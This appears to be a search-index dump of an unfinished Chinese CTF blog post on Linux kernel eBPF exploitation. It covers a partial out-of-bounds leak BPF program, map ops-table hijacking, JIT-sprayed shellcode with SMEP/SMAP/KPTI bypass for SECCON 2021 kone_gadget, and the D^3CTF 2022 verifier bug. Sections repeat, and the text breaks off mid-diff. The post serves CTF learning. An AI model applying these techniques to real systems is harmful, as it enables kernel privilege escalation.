45d000 462000 kernel [.bss] ► 0xffffffffc0225000 0xffffffffc0425000 r-xp 200000 0 kernel [.driver .bpf] +0x66c pwndbg\u003e 按s步入之后，就是在执行bpf程序了 我这里的程序能对应上： pwndbg\u003e p/x $rip $9 = 0xffffffffc022566c pwndbg\u003e x/30i 0xffffffffc022566c =\u003e 0xffffffffc022566c: endbr64 0xffffffffc0225670: nop DWORD PTR [rax+rax*1+0x0] 0xffffffffc0225675: nop DWORD PTR [rax] 0xffffffffc0225678: push rbp 0xffffffffc0225679: mov rbp,rsp 0xffffffffc022567c: endbr64 0xffffffffc0225680: sub rsp,0x8 0xffffffffc0225687: push rbx 0xffffffffc0225688: push r13 0xffffffffc022568a: push r14 0xffffffffc022568c: push r15 0xffffffffc022568e: xor eax,eax #BPF_MOV64_IMM(BPF_REG_0, 0), 0xffffffffc0225690: mov edi,0x63626160 #BPF_MOV64_IMM(BPF_REG_1, test), 0xffffffffc0225695: mov DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 0xffffffffc0225698: lfence 0xffffffffc022569b: mov rbx,rdi #BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), 0xffffffffc022569e: movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map), 0xffffffffc02256a8: mov rsi,rbp #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), 0xffffffffc02256ab: add rsi,0xfffffffffffffffc #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), 0xffffffffc02256af: add rdi,0xf8 0xffffffffc02256b6: mov eax,DWORD PTR [rsi+0x0] 0xffffffffc02256b9: cmp rax,0x1 0xffffffffc02256bd: jae 0xffffffffc02256ce 0xffffffffc02256bf: and eax,0x0 0xffffffffc02256c2: imul rax,rax,0x150 0xffffffffc02256c9: add rax,rdi 0xffffffffc02256cc: jmp 0xffffffffc02256d0 0xffffffffc02256ce: xor eax,eax 0xffffffffc02256d0: test rax,rax 0xffffffffc02256d3: jne 0xffffffffc02256de size_t test = 0; memcpy(\u0026test, \"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\", 8); struct bpf_insn kleak_prog[] = { // load map_ptr_or_null in BPF_REG_0 BPF_MOV64_IMM(BPF_REG_0, 0), BPF_MOV64_IMM(BPF_REG_1, test), BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), BPF_MOV64_REG(BPF_REG_6, BPF_REG_1), BPF_LD_MAP_FD(BPF_REG_1, oob_map), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map) pwndbg\rpwndbg有一个命令kbpf，但是题目编译的内核一般用不了这个命令，少了点东西。。。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:9","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#pwndbg"},{"categories":["pwn"],"collections":null,"content":"pwn思路\r当我们用bpf系统调用创建了一个类型为BPF_MAP_TYPE_ARRAY的map的时候，会创建一个结构体： struct bpf_array { struct bpf_map map; /* 0 240 */ /* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */ u32 elem_size; /* 240 4 */ u32 index_mask; /* 244 4 */ struct bpf_array_aux * aux; /* 248 8 */ /* --- cacheline 4 boundary (256 bytes) --- */ union { struct { struct { } __empty_value; /* 256 0 */ char value[0]; /* 256 0 */ }; /* 256 0 */ struct { struct { } __empty_ptrs; /* 256 0 */ void * ptrs[0]; /* 256 0 */ }; /* 256 0 */ struct { struct { } __empty_pptrs; /* 256 0 */ void * pptrs[0]; /* 256 0 */ }; /* 256 0 */ }; /* 256 0 */ /* size: 256, cachelines: 4, members: 5 */ }; 其中最重要的就是第一个成员： struct bpf_map { const struct bpf_map_ops * ops; /* 0 8 */ struct bpf_map * inner_map_meta; /* 8 8 */ void * security; /* 16 8 */ enum bpf_map_type map_type; /* 24 4 */ u32 key_size; /* 28 4 */ u32 value_size; /* 32 4 */ u32 max_entries; /* 36 4 */ u64 map_extra; /* 40 8 */ u32 map_flags; /* 48 4 */ u32 id; /* 52 4 */ struct btf_record * record; /* 56 8 */ /* --- cacheline 1 boundary (64 bytes) --- */ int numa_node; /* 64 4 */ u32 btf_key_type_id; /* 68 4 */ u32 btf_value_type_id; /* 72 4 */ u32 btf_vmlinux_value_type_id; /* 76 4 */ struct btf * btf; /* 80 8 */ char name[16]; /* 88 16 */ struct mutex freeze_mutex; /* 104 32 */ /* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */ atomic64_t refcnt; /* 136 8 */ atomic64_t usercnt; /* 144 8 */ union { struct work_struct work; /* 152 32 */ struct callback_head rcu; /* 152 16 */ }; /* 152 32 */ atomic64_t writecnt; /* 184 8 */ /* --- cacheline 3 boundary (192 bytes) --- */ struct { const struct btf_type * attach_func_proto; /* 192 8 */ spinlock_t lock; /* 200 4 */ enum bpf_prog_type type; /* 204 4 */ bool jited; /* 208 1 */ bool xdp_has_frags; /* 209 1 */ } owner; /* 192 24 */ /* XXX last struct has 6 bytes of padding */ bool bypass_spec_v1; /* 216 1 */ bool frozen; /* 217 1 */ bool free_after_mult_rcu_gp; /* 218 1 */ bool free_after_rcu_gp; /* 219 1 */ /* XXX 4 bytes hole, try to pack */ atomic64_t sleepable_refcnt; /* 224 8 */ s64 * elem_count; /* 232 8 */ /* size: 240, cachelines: 4, members: 29 */ /* sum members: 236, holes: 1, sum holes: 4 */ /* paddings: 1, sum paddings: 6 */ /* last cacheline: 48 bytes */ }; bpf_map_ops中存的是一系列虚表函数。通常，我们需要通过越界读写等手段，修改这个虚表 // include/linux/bpf.h /* map is generic key/value storage optionally accessible by eBPF programs */ struct bpf_map_ops { // ... /* funcs callable from userspace and from eBPF programs */ void *(*map_lookup_elem)(struct bpf_map *map, void *key); long (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags); long (*map_delete_elem)(struct bpf_map *map, void *key); long (*map_push_elem)(struct bpf_map *map, void *value, u64 flags); long (*map_pop_elem)(struct bpf_map *map, void *value); // ... }; 泄露地址：把ops写回bpf_array中的values域中，读出来即可 任意地址读写：在values中伪造一个ops，劫持ops指针指向这个伪造的ops，这样调用某个虚表函数其实是调用我们想要调用的函数 helper function是内核定义的函数，能被ebpf程序调用 重要的函数： bpf_map_lookup_elem： ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:10","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#pwn思路"},{"categories":["pwn"],"collections":null,"content":"模板\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:11","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#模板"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/syscall.h\u003e #include \u003cerrno.h\u003e int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#例题"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#sec-con-ctf-2021-kone_gadget"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#编写shellcode"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + 